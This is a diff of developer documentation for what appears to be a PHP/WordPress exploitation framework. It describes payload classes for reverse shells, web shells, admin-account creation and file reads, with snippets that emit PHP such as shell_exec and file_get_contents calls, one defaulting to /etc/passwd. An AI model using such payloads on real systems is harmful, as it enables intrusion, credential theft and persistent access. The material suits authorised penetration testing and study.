@@ -38,7 +38,7 @@ class MyPayload(Payload):
 | Property | Type | Description |
 |----------|------|-------------|
 | `name` | str | Human-readable name |
-| `methods` | list | Capabilities this payload works with (e.g. `["RCE", "RCEs"]`) |
+| `methods` | list | Capabilities this payload works with (e.g. `["RCE", "AFU"]`) |
 
 ## Optional Class Properties
 
@@ -62,8 +62,9 @@ def instructions(self, method):
 
     if method == "LFI":
         return [filepath]
-    elif method == "RCEs":
-        return [f"cat {filepath}"]
+    elif method == "RCE":
+        safe = filepath.replace("'", "\\'")
+        return [f"<?php echo file_get_contents('{safe}'); ?>"]
 ```
 
 Return a list even for a single instruction. Each instruction is delivered
@@ -91,7 +92,7 @@ Declare options so they appear in the interactive TUI and can be passed via CLI.
 ```python
 class RevShell(Payload):
     name = "Reverse Shell"
-    methods = ["RCE", "RCEs"]
+    methods = ["RCE", "AFU"]
     options = [
         {"name": "lhost", "default": "", "help": "Listener IP (required)"},
         {"name": "lport", "default": "4444", "help": "Listener port"},
@@ -166,21 +167,25 @@ A payload can work with different capabilities. Use the `method` parameter
 to generate the right instruction:
 
 ```python
-class Bash(Payload):
-    name = "Bash Command"
-    methods = ["RCE", "RCEs"]
+class FileRead(Payload):
+    name = "File Read"
+    methods = ["LFI", "FILEDL", "RCE"]
 
     def instructions(self, method):
-        cmd = self.options.get("cmd", "")
+        path = self.options.get("file", "/etc/passwd")
 
-        if method == "RCE":
-            # Wrap in PHP for RCE capability
-            safe = cmd.replace("'", "'\\''")
-            return [f"<?php echo shell_exec('{safe}'); ?>"]
-        elif method == "RCEs":
-            # Direct shell command
-            return [cmd]
+        if method in ("LFI", "FILEDL"):
+            # These deliver a path directly
+            return [path]
+        elif method == "RCE":
+            # RCE delivers PHP that reads the file
+            safe = path.replace("'", "\\'")
+            return [f"<?php echo file_get_contents('{safe}'); ?>"]
 ```
+
+There is no shell method: `RCE` payloads always emit PHP. If the vulnerable sink
+is an OS shell, the *exploit* wraps that PHP as `php -r` (see
+`Exploit.php_shell`) — the payload doesn't need to know.
 
 ## RCE Payloads Must Be Standalone
 
@@ -236,13 +241,18 @@ echo @file_exists($f)
 
 | Payload | Methods | Description |
 |---------|---------|-------------|
-| `admin_user` | RCE, SQLi | Create a WordPress admin account |
-| `bash` | RCE, RCEs | Execute shell commands |
-| `file_read` | LFI, RCEs | Read a file from the target |
-| `filebrowser` | RCE | Deploy web-based file manager |
+| `admin_user` | RCE, SQLI | Create a WordPress admin account |
+| `bash` | RCE | Execute shell commands |
+| `file_read` | LFI, FILEDL, RCE | Read a file from the target |
+| `filebrowser` | RCE, AFU, RFI | Deploy web-based file manager |
 | `php` | RCE | Execute arbitrary PHP code |
-| `revshell` | RCE, RCEs | Spawn a reverse shell |
-| `webshell` | RCE | Deploy browser-based web shell |
+| `revshell` | RCE, AFU | Spawn a reverse shell |
+| `webshell` | RCE, AFU, RFI | Deploy browser-based web shell |
+
+Note: `SQLI` is write-capable (statement) injection — the `admin_user` SQL path
+runs INSERTs, so it needs `SQLI`, not the read-only `SQLIq`. There is one
+code-execution method, `RCE` (PHP); a shell-only sink is the exploit's concern
+(it wraps `php -r`), so payloads emit PHP and never a raw shell command.
 
 ## Template
 
